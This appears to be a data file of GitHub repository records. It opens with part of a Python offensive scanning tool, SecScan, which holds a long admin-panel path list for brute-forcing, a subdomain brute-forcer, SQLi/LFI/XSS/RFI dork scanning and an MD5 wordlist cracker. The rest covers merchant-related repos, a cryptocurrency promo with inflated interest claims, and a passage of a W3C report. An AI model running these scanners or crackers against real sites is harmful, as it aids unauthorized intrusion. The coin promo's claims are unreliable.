\'modelsearch/login.php\', \'moderator.php\', \'moderator/login.php\', \'moderator/admin.php\', \'account.php\', \'pages/admin/admin-login.html\', \'admin/admin-login.html\',             \'admin-login.html\', \'controlpanel.php\', \'admincontrol.php\', \'admin/adminLogin.html\' ,\'adminLogin.html\', \'admin/adminLogin.html\', \'home.html\',             \'rcjakar/admin/login.php\', \'adminarea/index.html\', \'adminarea/admin.html\', \'webadmin.php\', \'webadmin/index.php\', \'webadmin/admin.php\', \'admin/controlpanel.html\',             \'admin.html\', \'admin/cp.html\', \'cp.html\', \'adminpanel.php\', \'moderator.html\', \'administrator/index.html\', \'administrator/login.html\', \'user.html\',             \'administrator/account.html\', \'administrator.html\', \'login.html\', \'modelsearch/login.html\', \'moderator/login.html\', \'adminarea/login.html\',             \'panel-administracion/index.html\', \'panel-administracion/admin.html\', \'modelsearch/index.html\', \'modelsearch/admin.html\', \'admincontrol/login.html\',             \'adm/index.html\', \'adm.html\', \'moderator/admin.html\', \'user.php\', \'account.html\', \'controlpanel.html\', \'admincontrol.html\', \'panel-administracion/login.php\',             \'wp-login.php\', \'wp-admin\', \'typo3\', \'adminLogin.php\', \'admin/adminLogin.php\', \'home.php\',\'adminarea/index.php\' ,\'adminarea/admin.php\' ,\'adminarea/login.php\',             \'panel-administracion/index.php\', \'panel-administracion/admin.php\', \'modelsearch/index.php\', \'modelsearch/admin.php\', \'admincontrol/login.php\',             \'adm/admloginuser.php\', \'admloginuser.php\', \'admin2.php\', \'admin2/login.php\', \'admin2/index.php\', \'adm/index.php\', \'adm.php\', \'affiliate.php\',\'admin/admin.asp\',\'admin/login.asp\',\'admin/index.asp\',\'admin/admin.aspx\',\'admin/login.aspx\',\'admin/index.aspx\',\'admin/webmaster.asp\',\'admin/webmaster.aspx\',\'asp/admin/index.asp\',\'asp/admin/index.aspx\',\'asp/admin/admin.asp\',\'asp/admin/admin.aspx\',\'asp/admin/webmaster.asp\',\'asp/admin/webmaster.aspx\',\'admin/\',\'login.asp\',\'login.aspx\',\'admin.asp\',\'admin.aspx\',\'webmaster.aspx\',\'webmaster.asp\',\'login/index.asp\',\'login/index.aspx\',\'login/login.asp\',\'login/login.aspx\',\'login/admin.asp\',\'login/admin.aspx\',\'administracion/index.asp\',\'administracion/index.aspx\',\'administracion/login.asp\',\'administracion/login.aspx\',\'administracion/webmaster.asp\',\'administracion/webmaster.aspx\',\'administracion/admin.asp\',\'administracion/admin.aspx\',\'php/admin/\',\'admin/admin.php\',\'admin/index.php\',\'admin/login.php\',\'admin/system.php\',\'admin/ingresar.php\',\'admin/administrador.php\',\'admin/default.php\',\'administracion/\',\'administracion/index.php\',\'administracion/login.php\',\'administracion/ingresar.php\',\'administracion/admin.php\',\'administration/\',\'administration/index.php\',\'administration/login.php\',\'administrator/index.php\',\'administrator/login.php\',\'administrator/system.php\',\'system/\',\'system/login.php\',\'admin.php\',\'login.php\',\'administrador.php\',\'administration.php\',\'administrator.php\',\'admin1.html\',\'admin1.php\',\'admin2.php\',\'admin2.html\',\'yonetim.php\',\'yonetim.html\',\'yonetici.php\',\'yonetici.html\',\'adm/\',\'admin/account.php\',\'admin/account.html\',\'admin/index.html\',\'admin/login.html\',\'admin/home.php\',\'admin/controlpanel.html\',\'admin/controlpanel.php\',\'admin.html\',\'admin/cp.php\',\'admin/cp.html\',\'cp.php\',\'cp.html\',\'administrator/\',\'administrator/index.html\',\'administrator/login.html\',\'administrator/account.html\',\'administrator/account.php\',\'administrator.html\',\'login.html\',\'modelsearch/login.php\',\'moderator.php\',\'moderator.html\',\'moderator/login.php\',\'moderator/login.html\',\'moderator/admin.php\',\'moderator/admin.html\',\'moderator/\',\'account.php\',\'account.html\',\'controlpanel/\',\'controlpanel.php\',\'controlpanel.html\',\'admincontrol.php\',\'admincontrol.html\',\'adminpanel.php\',\'adminpanel.html\',\'admin1.asp\',\'admin2.asp\',\'yonetim.asp\',\'yonetici.asp\',\'admin/account.asp\',\'admin/home.asp\',\'admin/controlpanel.asp\',\'admin/cp.asp\',\'cp.asp\',\'administrator/index.asp\',\'administrator/login.asp\',\'administrator/account.asp\',\'administrator.asp\',\'modelsearch/login.asp\',\'moderator.asp\',\'moderator/login.asp\',\'moderator/admin.asp\',\'account.asp\',\'controlpanel.asp\',\'admincontrol.asp\',\'adminpanel.asp\',\'fileadmin/\',\'fileadmin.php\',\'fileadmin.asp\',\'fileadmin.html\',\'administration.html\',\'sysadmin.php\',\'sysadmin.html\',\'phpmyadmin/\',\'myadmin/\',\'sysadmin.asp\',\'sysadmin/\',\'ur-admin.asp\',\'ur-admin.php\',\'ur-admin.html\',\'ur-admin/\',\'Server.php\',\'Server.html\',\'Server.asp\',\'Server/\',\'wp-admin/\',\'administr8.php\',\'administr8.html\',\'administr8/\',\'administr8.asp\',\'webadmin/\',\'webadmin.php\',\'webadmin.asp\',\'webadmin.html\',\'administratie/\',\'admins/\',\'admins.php\',\'admins.asp\',\'admins.html\',\'administrivia/\',\'Database_Administration/\',\'WebAdmin/\',\'useradmin/\',\'sysadmins/\',\'admin1/\',\'system-administration/\',\'administrators/\',\'pgadmin/\',\'directadmin/\',\'staradmin/\',\'ServerAdministrator/\',\'SysAdmin/\',\'administer/\',\'LiveUser_Admin/\',\'sys-admin/\',\'typo3/\',\'panel/\',\'cpanel/\',\'cPanel/\',\'cpanel_file/\',\'platz_login/\',\'rcLogin/\',\'blogindex/\',\'formslogin/\',\'autologin/\',\'support_login/\',\'meta_login/\',\'manuallogin/\',\'simpleLogin/\',\'loginflat/\',\'utility_login/\',\'showlogin/\',\'memlogin/\',\'members/\',\'login-redirect/\',\'sub-login/\',\'wp-login/\',\'login1/\',\'dir-login/\',\'login_db/\',\'xlogin/\',\'smblogin/\',\'customer_login/\',\'UserLogin/\',\'login-us/\',\'acct_login/\',\'admin_area/\',\'bigadmin/\',\'project-admins/\',\'phppgadmin/\',\'pureadmin/\',\'sql-admin/\',\'radmind/\',\'openvpnadmin/\',\'wizmysqladmin/\',\'vadmind/\',\'ezsqliteadmin/\',\'hpwebjetadmin/\',\'newsadmin/\',\'adminpro/\',\'Lotus_Domino_Admin/\',\'bbadmin/\',\'vmailadmin/\',\'Indy_admin/\',\'ccp14admin/\',\'irc-macadmin/\',\'banneradmin/\',\'sshadmin/\',\'phpldapadmin/\',\'macadmin/\',\'administratoraccounts/\',\'admin4_account/\',\'admin4_colon/\',\'radmind-1/\',\'Super-Admin/\',\'AdminTools/\',\'cmsadmin/\',\'SysAdmin2/\',\'globes_admin/\',\'cadmins/\',\'phpSQLiteAdmin/\',\'navSiteAdmin/\',\'server_admin_small/\',\'logo_sysadmin/\',\'server/\',\'database_administration/\',\'power_user/\',\'system_administration/\',\'ss_vms_admin_sm/\']          for add in dirs:         test = site + add         queue.put(test)              for i in range(20):         thread = Atest(queue)         thread.setDaemon(True)         thread.start()      queue.join()  def aprint():     """"""Print results of admin page scans""""""     print \'Search Finished\\n\'     if len(found) == 0:         print \'No pages found\'     else:         for site in found:             print O+\'Found: \' + G+site + W          class SDtest(threading.Thread):     """"""Checks given Domain for Sub Domains""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.queue = queue       def run(self):         """"""Checks if Sub Domain responds""""""         while True:             try:                 domain = self.queue.get(False)             except Queue.Empty:                 break             try:                 site = \'http://\' + domain                 conn = urllib2.Request(site)                 conn.add_header(\'User-Agent\', choice(USER_AGENT))                 opener = urllib2.build_opener()                 opener.open(conn)             except urllib2.URLError:                 self.queue.task_done()             else:                 target = socket.gethostbyname(domain)                   print \'Found: \' + site + \' - \' + target                 self.queue.task_done()            def subd():     """"""Create queue and threads for sub domain scans""""""     queue = Queue.Queue()     site = raw_input(\'Domain: \')     sub = [""admin"", ""access"", ""accounting"", ""accounts"", ""admin"", ""administrator"", ""aix"", ""ap"", ""archivos"", ""aula"", ""aulas"", ""ayuda"", ""backup"", ""backups"", ""bart"", ""bd"", ""beta"", ""biblioteca"",             ""billing"", ""blackboard"", ""blog"", ""blogs"", ""bsd"", ""cart"", ""catalog"", ""catalogo"", ""catalogue"", ""chat"", ""chimera"", ""citrix"", ""classroom"", ""clientes"", ""clients"", ""carro"",             ""connect"", ""controller"", ""correoweb"", ""cpanel"", ""csg"", ""customers"", ""db"", ""dbs"", ""demo"", ""demon"", ""demostration"", ""descargas"", ""developers"", ""development"", ""diana"",             ""directory"", ""dmz"", ""domain"", ""domaincontroller"", ""download"", ""downloads"", ""ds"", ""eaccess"", ""ejemplo"", ""ejemplos"", ""email"", ""enrutador"", ""example"", ""examples"", ""exchange"",             ""eventos"", ""events"", ""extranet"", ""files"", ""finance"", ""firewall"", ""foro"", ""foros"", ""forum"", ""forums"", ""ftp"", ""ftpd"", ""fw"", ""galeria"", ""gallery"", ""gateway"", ""gilford"",             ""groups"", ""groupwise"", ""guia"", ""guide"", ""gw"", ""help"", ""helpdesk"", ""hera"", ""heracles"", ""hercules"", ""home"", ""homer"", ""hotspot"", ""hypernova"", ""images"", ""imap"", ""imap3"", ""imap3d"",             ""imapd"", ""imaps"", ""imgs"", ""imogen"", ""inmuebles"", ""internal"", ""intranet"", ""ipsec"", ""irc"", ""ircd"", ""jabber"", ""laboratorio"", ""lab"", ""laboratories"", ""labs"", ""library"", ""linux"", ""lisa"",  ""login"", ""logs"", ""mail"", ""mailgate"", ""manager"", ""marketing"", ""members"", ""mercury"", ""meta"", ""meta01"", ""meta02"", ""meta03"", ""miembros"", ""minerva"", ""mob"", ""mobile"", ""moodle"", ""movil"",             ""mssql"", ""mx"", ""mx0"", ""mx1"", ""mx2"", ""mx3"", ""mysql"", ""nelson"", ""neon"", ""netmail"", ""news"", ""novell"", ""ns"", ""ns0"", ""ns1"", ""ns2"", ""ns3"", ""online"", ""oracle"", ""owa"", ""partners"", ""pcanywhere"",             ""pegasus"", ""pendrell"", ""personal"", ""photo"", ""photos"", ""pop"", ""pop3"", ""portal"", ""postman"", ""postmaster"", ""private"", ""proxy"", ""prueba"", ""pruebas"", ""public"", ""ras"", ""remote"", ""reports"", ""research"",             ""restricted"", ""robinhood"", ""router"", ""rtr"", ""sales"", ""sample"", ""samples"", ""sandbox"", ""search"", ""secure"", ""seguro"", ""server"", ""services"", ""servicios"", ""servidor"", ""shop"", ""shopping"",             ""smtp"", ""socios"", ""soporte"", ""squirrel"", ""squirrelmail"", ""ssh"", ""staff"", ""sms"", ""solaris"", ""sql"", ""stats"", ""sun"", ""support"", ""test"", ""tftp"", ""tienda"", ""unix"", ""upload"", ""uploads"",             ""ventas"", ""virtual"", ""vista"", ""vnc"", ""vpn"", ""vpn1"", ""vpn2"", ""vpn3"", ""wap"", ""web1"", ""web2"", ""web3"", ""webct"", ""webadmin"", ""webmail"", ""webmaster"", ""win"", ""windows"", ""www"", ""ww0"", ""ww1"",             ""ww2"", ""ww3"", ""www0"", ""www1"", ""www2"", ""www3"", ""xanthus"", ""zeus""]      for check in sub:         test = check + \'.\' + site         queue.put(test)              for i in range(20):         thread = SDtest(queue)         thread.setDaemon(True)         thread.start()      queue.join()   class Cracker(threading.Thread):     """"""Use a wordlist to try and brute the hash""""""     def __init__(self, queue, hashm):         threading.Thread.__init__(self)         self.queue = queue         self.hashm = hashm      def run(self):          """"""Hash word and check against hash""""""         while True:             try:                 word = self.queue.get(False)             except Queue.Empty:                 break             tmp = hashlib.md5(word).hexdigest()             if tmp == self.hashm:                 self.result(word)                self.queue.task_done()       def result(self, words):         """"""Print result if found""""""         print self.hashm + \' = \' + words  def word():     """"""Create queue and threads for hash crack""""""     queue = Queue.Queue()     wordlist = raw_input(\'Wordlist: \')     hashm = raw_input(\'Enter Md5 hash: \')     read = open(wordlist)     for words in read:         words = words.replace(""\\n"","""")         queue.put(words)            read.close()     for i in range(5):         thread = Cracker(queue, hashm)         thread.setDaemon(True)         thread.start()     queue.join()   class OnlineCrack:     """"""Use online service to check for hash""""""      def crack(self):         """"""Connect and check hash""""""         hashm = raw_input(\'Enter MD5 Hash: \')         conn = urllib2.Request(\'http://md5.hashcracking.com/search.php?md5=%s\' % (hashm))         conn.add_header(\'User-Agent\', choice(USER_AGENT))         opener = urllib2.build_opener()         opener.open(conn)         data = opener.open(conn).read()         if data == \'No results returned.\':             print \'\\n- Not found or not valid -\'         else:             print \'\\n- %s -\' % (data)   class Check:     """"""Check your current IP address""""""      def grab(self):         """"""Connect to site and grab IP""""""         site = \'http://www.tracemyip.org/\'         try:             conn = urllib2.Request(site)             conn.add_header(\'User-Agent\', choice(USER_AGENT))             opener = urllib2.build_opener()             opener.open(conn)             data = opener.open(conn).read()               start = 0             end = len(data)                  start = data.find(\'onClick=""\', start, end)             end = data.find(\'size=\', start, end)                ip_add = data[start+46:end-2].strip()             print \'\\nYour current Ip address is %s\' % (ip_add)                  except urllib2.HTTPError:             print \'Error connecting\'       def output():     """"""Outputs dork scan results to screen""""""     print \'\\n>> \' + str(vuln) + G+\' Vulnerable Sites Found\' + W     print \'>> \' + str(invuln) + G+\' Sites Not Vulnerable\' + W     print \'>> \' + str(np) + R+\' Sites Without Parameters\' + W     if option == \'1\':         print \'>> Output Saved To sqli.txt\\n\'     elif option == \'2\':         print \'>> Output Saved To lfi.txt\'     elif option == \'3\':         print \'>> Output Saved To xss.txt\'     elif option == \'4\':         print \'>> Output Saved To rfi.txt\'     W  = ""\\033[0m"";   R  = ""\\033[31m"";  G  = ""\\033[32m"";  O  = ""\\033[33m"";  B  = ""\\033[34m"";  def main():     """"""Outputs Menu and gets input""""""     quotes = [ \t\'\\nm0le@tormail.org\\n\'         ]     print (O+\'\'\' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------\'\'\')     print (G+\'\'\' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address\'\'\')      print (B+\'\'\' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. \'\'\')     print W     global option     option = raw_input(\'Enter Option: \')       if option:         if option == \'1\':             Crawl()             output()             print choice(quotes)                      elif option == \'2\':             Crawl()             output()             print choice(quotes)           elif option == \'3\':             Crawl()             output()             print choice(quotes)           elif option == \'4\':             Crawl()             output()             print choice(quotes)               elif option == \'5\':             Ip()             print choice(quotes)           elif option == \'6\':             admin()             aprint()             print choice(quotes)          elif option == \'7\':             subd()             print choice(quotes)          elif option == \'8\':             word()             print choice(quotes)            elif option == \'9\':             OnlineCrack().crack()             print choice(quotes)                              elif option == \'10\':             Check().grab()               print choice(quotes)                 else:             print R+\'\\nInvalid Choice\\n\' + W             time.sleep(0.9)             main()           else:         print R+\'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n\' + W         time.sleep(0.9)         main()     if __name__ == \'__main__\':     main()",,7
0,https://github.com/icos-urenio/virtual-city-market.git,Empowers the city local marketplace by bringing together customers and merchants.,,6
0,https://github.com/hiqdev/omnipay-robokassa.git,RoboKassa plugin for PHP merchant library,hacktoberfest,6
0,https://github.com/sellerated/fba_fee_calculator.git,Calculates Amazon FBA Fees for Merchants,,6
0,https://github.com/LilleJohs/UseNano.org.git,Usenano.org is a website that lists all merchants that accept Nano as payment.,,6
0,https://github.com/arcticfalcon/emv-qr-cps.git,EMV QR Code Specification for Payment Systems: Merchant-Presented Mode,,6
0,https://github.com/square/active_merchant_square.git,"{""Square's e-commerce API support added to Active Merchant. (This depends on core active merchant, so it can coexist peacefully with upstream changes there. Not merged into Active Merchant for reasons as described here https://github.com/activemerchant/active_merchant/pull/2242)  See example below, and our blog post: https://medium.com/square-corner-blog/activemerchantsquare-for-squares-e-commerce-api-111ea63e530a""}",,6
0,https://github.com/Cybermaxke/MerchantsAPI.git,A simple merchants api for the bukkit api.,"bukkit-api,plugin,minecraft,java",6
0,https://github.com/CoinifySoftware/php-sdk.git,A PHP wrapper for Coinify merchant API and callbacks,,6
0,https://github.com/ringkubd/AbKash.git,A laravel package for bKash merchant  transaction verification,"laravel,payment-gateway,bkash-online-payment,bkash,api,laravel-payments",6
0,https://github.com/geopayme/btcMarketPlace.git,"{""Geopay's Merchant MarketPlace""}",,6
0,https://github.com/Kovah/Tradefinder.git,A web tool to find the most profitable trades between two merchants. Perfect for gamers. üéÆ,"trading,videogames,gaming,tool,tools,react,spa,calculator",6
0,https://github.com/themestechnology/magento-google-merchant-center-shopping-feed-atom.git,"{""Made for Magento 1.9.0.1+ this script will make an atom xml document for Google's Merchant Center Shopping Feed""}",,6
0,https://github.com/tonolucro/delivery-merchant-php.git,Biblioteca PHP de integra√ß√£o com a //API Tonolucro Merchant,,6
0,https://github.com/schmidyy/boostify.git,Connecting Merchant to Influencers for simple paid promotions üéâ,,6
0,https://github.com/Reverse-Thinking/VoiceBroadcast.git,ÂïÜÊà∑Êî∂Ê¨æËØ≠Èü≥Êí≠Êä• Merchant collection voice broadcast,,6
0,https://github.com/ghassani/miva-sql-component.git,A Miva Merchant Utility/Component Module to Execute SQL Queries in Miva Templating Language,,6
0,https://github.com/zdyshine/Classification-merchant-signs.git,2018 Baidu merchant signboard classification and testing contestÔºö2018ÁôæÂ∫¶ÂïÜÂÆ∂ÊãõÁâåÁöÑÂàÜÁ±ª‰∏éÊ£ÄÊµãÂ§ßËµõ,,6
0,https://github.com/BlockchainLabs/NetCoin.git,"Why NETCOIN (NET) Netcoin, like anything else in the world, is ‚Äúworth‚Äù what we as a species value it to be.  Which, of course then begs the question, why should we value Netcoin?  For starters:  It‚Äôs a safer way to use/spend/receive money than Fiat (for example‚Ä¶.USD/GBP/CNY) It‚Äôs a faster way to send/receive money than Fiat It‚Äôs not subject to the inflation escalations we‚Äôve observed with fiat currencies of recent It‚Äôs built off of and developed from the same trusted technology as Bitcoin It‚Äôs Faster than Bitcoin You can earn up to 100% interest on the amount of NET you own and store in your personal wallet* Current Value of NET NET (NET) 0.00000037 BTC ‚Üë NET (NET) 0.00024805 USD ‚Üë NET (NET) 0.00164974 CNY ‚Üë NET (NET) 0.00022426 EUR ‚Üë Updated 12 July 2016 17:42:32 UTC+1:00 Powered by Cryptonator BASICS FOR GETTING STARTED GET NET  One of the First things to do (besides saying hi to the community) is to obtain your own NET wallet.  This fantastic little secure and safe program operates as your own Personal Bank.  The wallet is where your NET are securely stored and also where you will Deposit, Withdraw, and Send your NET. ADD NET  Next, you‚Äôll want to add some NET to your wallet (Why?  Because you can earn interest‚Ä¶or what‚Äôs called ‚Äúminting‚Äù, on every NET you hold in your wallet that‚Äôs connected to the Network). USE NET  Now you can start to use NET just like you would money.  The number of Merchants accepting NET is growing, and the more we build (the community, NET features, NET acceptance), the sooner we‚Äôll be able to use NET for everyday transactions. FREQUENTLY ASKED QUESTIONS What is Netcoin (NET)? Netcoin is a global cryptocurrency that was created in September, 2013.  Originally based on litecoin‚Äôs coin core, it has since been developed and upgraded to include custom coin code making it unique from every other crypto.  What‚Äôs its algorithm? Every coin has an algorithm (or put another way, its base code).  Netcoin is a scrypt Proof of Work / Proof of Stake hybrid.  How can I get NET? The easiest method of obtaining NET at the present time is by asking for some :)  We‚Äôll gladly get you set up if you ask (with your own wallet and Netcoins).  After that, you can exchange your Fiat currency for satoshi (or bitcoin), and then trade that for NET on several exchanges.  How much is this going to cost me? Netcoin is free to use.  This is unlike current banks and ‚Äúpayment processors‚Äù‚Ä¶where you are charged 1%, 2% or sometimes upwards of 5% for using their services.  With NET, you have the ability to send as little or as much money as you‚Äôd like to anyone else that has a NET wallet.  It‚Äôs that simple.  How can I help NET? Simple! By telling your friends, family, neighbors and even pets! Netcoin is a very easy and friendly cryptocurrency that anyone can understand! By spreading the knowledge about Netcoin further we will all grow together and rise to the new futures that we all have before us!  Additionally, feel free to contact us if you‚Äôd like to help support Netcoin in a more official manner.",,6
0,https://github.com/jettbrains/-L-.git,"W3C Strategic Highlights  September 2019  This report was prepared for the September 2019 W3C Advisory Committee Meeting (W3C Member link). See the accompanying W3C Fact Sheet ‚Äî September 2019. For the previous edition, see the April 2019 W3C Strategic Highlights. For future editions of this report, please consult the latest version.  A Chinese translation is available.  ‚ò∞ Contents  Introduction Future Web Standards Meeting Industry Needs Web Payments Digital Publishing Media and Entertainment Web & Telecommunications Real-Time Communications (WebRTC) Web & Networks Automotive Web of Things Strengthening the Core of the Web HTML CSS Fonts SVG Audio Performance Web Performance WebAssembly Testing Browser Testing and Tools WebPlatform Tests Web of Data Web for All Security, Privacy, Identity Internationalization (i18n) Web Accessibility Outreach to the world W3C Developer Relations W3C Training Translations W3C Liaisons Introduction  This report highlights recent work of enhancement of the existing landscape of the Web platform and innovation for the growth and strength of the Web.  33 working groups and a dozen interest groups enable W3C to pursue its mission through the creation of Web standards, guidelines, and supporting materials. We track the tremendous work done across the Consortium through homogeneous work-spaces in Github which enables better monitoring and management.  We are in the middle of a period where we are chartering numerous working groups which demonstrate the rapid degree of change for the Web platform:  After 4 years, we are nearly ready to publish a Payment Request API Proposed Recommendation and we need to soon charter follow-on work. In the last year we chartered the Web Payment Security Interest Group. In the last year we chartered the Web Media Working Group with 7 specifications for next generation Media support on the Web. We have Accessibility Guidelines under W3C Member review which includes Silver, a new approach. We have just launched the Decentralized Identifier Working Group which has tremendous potential because Decentralized Identifier (DID) is an identifier that is globally unique, resolveable with high availability, and cryptographically verifiable. We have Privacy IG (PING) under W3C Member review which strengthens our focus on the tradeoff between privacy and function. We have a new CSS charter under W3C Member review which maps the group\'s work for the next three years. In this period, W3C and the WHATWG have succesfully completed the negotiation of a Memorandum of Understanding rooted in the mutual belief that that having two distinct specifications claiming to be normative is generally harmful for the Web community. The MOU, signed last May, describes how the two organizations are to collaborate on the development of a single authoritative version of the HTML and DOM specifications. W3C subsequently rechartered the HTML Working Group to assist the W3C community in raising issues and proposing solutions for the HTML and DOM specifications, and for the production of W3C Recommendations from WHATWG Review Drafts.  As the Web evolves continuously, some groups are looking for ways for specifications to do so as well. So-called ""evergreen recommendations"" or ""living standards"" aim to track continuous development (and maintenance) of features, on a feature-by-feature basis, while getting review and patent commitments.  We see the maturation and further development of an incredible number of new technologies coming to the Web. Continued progress in many areas demonstrates the vitality of the W3C and the Web community, as the rest of the report illustrates.  Future Web Standards W3C has a variety of mechanisms for listening to what the community thinks could become good future Web standards. These include discussions with the Membership, discussions with other standards bodies, the activities of thousands of participants in over 300 community groups, and W3C Workshops. There are lots of good ideas. The W3C strategy team has been identifying promising topics and invites public participation.   Future, recent and under consideration Workshops include:  Inclusive XR (5-6 November 2019, Seattle, WA, USA) to explore existing and future approaches on making Virtual and Augmented Reality experiences more inclusive, including to people with disabilities; W3C Workshop on Data Models for Transportation (12-13 September 2019, Palo Alto, CA, USA) W3C Workshop on Web Games (27-28 June 2019, Redmond, WA, USA), view report Second W3C Workshop on the Web of Things (3-5 June 2019, Munich, Germany) W3C Workshop on Web Standardization for Graph Data; Creating Bridges: RDF, Property Graph and SQL (4-6 March 2019, Berlin, Germany), view report Web & Machine Learning. The Strategy Funnel documents the staff\'s exploration of potential new work at various phases: Exploration and Investigation, Incubation and Evaluation, and eventually to the chartering of a new standards group. The Funnel view is a GitHub Project where new area are issues represented by ‚Äúcards‚Äù which move through the columns, usually from left to right. Most cards start in Exploration and move towards Chartering, or move out of the funnel.  Public input is welcome at any stage but particularly once Incubation has begun. This helps W3C identify work that is sufficiently incubated to warrant standardization, to review the ecosystem around the work and indicate interest in participating in its standardization, and then to draft a charter that reflects an appropriate scope. Ongoing feedback can speed up the overall standardization process.  Since the previous highlights document, W3C has chartered a number of groups, and started discussion on many more:  Newly Chartered or Rechartered  Web Application Security WG (03-Apr) Web Payment Security IG (17-Apr) Patent and Standards IG (24-Apr) Web Applications WG (14-May) Web & Networks IG (16-May) Media WG (23-May) Media and Entertainment IG (06-Jun) HTML WG (06-Jun) Decentralized Identifier WG (05-Sep) Extended  Privacy IG (PING) (30-Sep) Verifiable Claims WG (30-Sep) Service Workers WG (31-Dec) Dataset Exchange WG (31-Dec) Web of Things Working Group (31-Dec) Web Audio Working Group (31-Dec) Proposed charters / Advance Notice  Accessibility Guidelines WG Privacy IG (PING) RDF Literal Direction WG Timed Text WG CSS WG Web Authentication WG Closed  Internationalization Tag Set IG Meeting Industry Needs Web Payments   All Web Payments specifications  W3C\'s payments standards enable a streamlined checkout experience, enabling a consistent user experience across the Web with lower front end development costs for merchants. Users can store and reuse information and more quickly and accurately complete online transactions.  The Web Payments Working Group has republished Payment Request API as a Candidate Recommendation, aiming to publish a Proposed Recommendation in the Fall 2019, and is discussing use cases and features for Payment Request after publication of the 1.0 Recommendation. Browser vendors have been finalizing implementation of features added in the past year (view the implementation report).  As work continues on the Payment Handler API and its implementation (currently in Chrome and Edge Canary), one focus in 2019 is to increase adoption in other browsers. Recently, Mastercard demonstrated the use of Payment Request API to carry out EMVCo\'s Secure Remote Commerce (SRC) protocol whose payment method definition is being developed with active participation by Visa, Mastercard, American Express, and Discover. Payment method availability is a key factor in merchant considerations about adopting Payment Request API. The ability to get uniform adoption of a new payment method such as Secure Remote Commerce (SRC) also depends on the availability of the Payment Handler API in browsers, or of proprietary alternatives.  Web Monetization, which the Web Payments Working Group will discuss again at its face-to-face meeting in September, can be used to enable micropayments as an alternative revenue stream to advertising.  Since the beginning of 2019, Amazon, Brave Software, JCB, Certus Cybersecurity Solutions and Netflix have joined the Web Payments Working Group.  In April, W3C launched the Web Payment Security Group to enable W3C, EMVCo, and the FIDO Alliance to collaborate on a vision for Web payment security and interoperability. Participants will define areas of collaboration and identify gaps between existing technical specifications in order to increase compatibility among different technologies, such as:  How do SRC, FIDO, and Payment Request relate? The Payment Services Directive 2 (PSD2) regulations in Europe are scheduled to take effect in September 2019. What is the role of EMVCo, W3C, and FIDO technologies, and what is the current state of readiness for the deadline? How can we improve privacy on the Web at the same time as we meet industry requirements regarding user identity? Digital Publishing   All Digital Publishing specifications, Publication milestones  The Web is the universal publishing platform. Publishing is increasingly impacted by the Web, and the Web increasingly impacts Publishing.  Topic of particular interest to Publishing@W3C include typography and layout, accessibility, usability, portability, distribution, archiving, offline access, print on demand, and reliable cross referencing. And the diverse publishing community represented in the groups consist of the traditional ""trade"" publishers, ebook reading system manufacturers, but also publishers of audio book, scholarly journals or educational materials, library scientists or browser developers.  The Publishing Working Group currently concentrates on Audiobooks which lack a comprehensive standard, thus incurring extra costs and time to publish in this booming market. Active development is ongoing on the future standard:  Publication Manifest Audiobook profile for Web Publications Lightweight Packaging Format The BD Comics Manga Community Group, the Synchronized Multimedia for Publications Community Group, the Publishing Community Group and a future group on archival, are companions to the working group where specific work is developed and incubated.  The Publishing Community Group is a recently launched incubation channel for Publishing@W3C. The goal of the group is to propose, document, and prototype features broadly related to:  publications on the Web reading modes and systems and the user experience of publications The EPUB 3 Community Group has successfully completed the revision of EPUB 3.2.  The Publishing Business Group fosters ongoing participation by members of the publishing industry and the overall ecosystem in the development of Web infrastructure to better support the needs of the industry. The Business Group serves as an additional conduit to the Publishing Working Group and several Community Groups for feedback between the publishing ecosystem and W3C. The Publishing BG has played a vital role in fostering and advancing the adoption and continued development of EPUB 3. In particular the BG provided critical support to the update of EPUBCheck to validate EPUB content to the new EPUB 3.2 specification. This resulted in the development, in conjunction with the EPUB3 Community Group, of a new generation of EPUBCheck, i.e., EPUBCheck 4.2 production-ready release.  Media and Entertainment   All Media specifications  The Media and Entertainment vertical tracks media-related topics and features that create immersive experiences for end users. HTML5 brought standard audio and video elements to the Web. Standardization activities since then have aimed at turning the Web into a professional platform fully suitable for the delivery of media content and associated materials, enabling missing features to stream video content on the Web such as adaptive streaming and content protection. Together with Microsoft, Comcast, Netflix and Google, W3C received an Technology & Engineering Emmy Award in April 2019 for standardization of a full TV experience on the Web. Current goals are to:  Reinforce core media technologies: Creation of the Media Working Group, to develop media-related specifications incubated in the WICG (e.g. Media Capabilities, Picture-in-picture, Media Session) and maintain maintain/evolve Media Source Extensions (MSE) and Encrypted Media Extensions (EME). Improve support for Media Timed Events: data cues incubation. Enhance color support (HDR, wide gamut), in scope of the CSS WG and in the Color on the Web CG. Reduce fragmentation: Continue annual releases of a common and testable baseline media devices, in scope of the Web Media APIs CG and in collaboration with the CTA WAVE Project. Maintain the Road-map of Media Technologies for the Web which highlights Web technologies that can be used to build media applications and services, as well as known gaps to enable additional use cases. Create the future: Discuss perspectives for Media and Entertainment for the Web. Bring the power of GPUs to the Web (graphics, machine learning, heavy processing), under incubation in the GPU for the Web CG. Transition to a Working Group is under discussion. Determine next steps after the successful W3C Workshop on Web Games of June 2019. View the report. Timed Text  The Timed Text Working Group develops and maintains formats used for the representation of text synchronized with other timed media, like audio and video, and notably works on TTML, profiles of TTML, and WebVTT. Recent progress includes:  A robust WebVTT implementation report poises the specification for publication as a proposed recommendation. Discussions around re-chartering, notably to add a TTML Profile for Audio Description deliverable to the scope of the group, and clarify that rendering of captions within XR content is also in scope. Immersive Web  Hardware that enables Virtual Reality (VR) and Augmented Reality (AR) applications are now broadly available to consumers, offering an immersive computing platform with both new opportunities and challenges. The ability to interact directly with immersive hardware is critical to ensuring that the web is well equipped to operate as a first-class citizen in this environment.  The Immersive Web Working Group has been stabilizing the WebXR Device API while the companion Immersive Web Community Group incubates the next series of features identified as key for the future of the Immersive Web.  W3C plans a workshop focused on the needs and benefits at the intersection of VR & Accessibility (Inclusive XR), on 5-6 November 2019 in Seattle, WA, USA, to explore existing and future approaches on making Virtual and Augmented Reality experiences more inclusive.  Web & Telecommunications  The Web is the Open Platform for Mobile. Telecommunication service providers and network equipment providers have long been critical actors in the deployment of Web technologies. As the Web platform matures, it brings richer and richer capabilities to extend existing services to new users and devices, and propose new and innovative services.  Real-Time Communications (WebRTC)   All Real-Time Communications specifications  WebRTC has 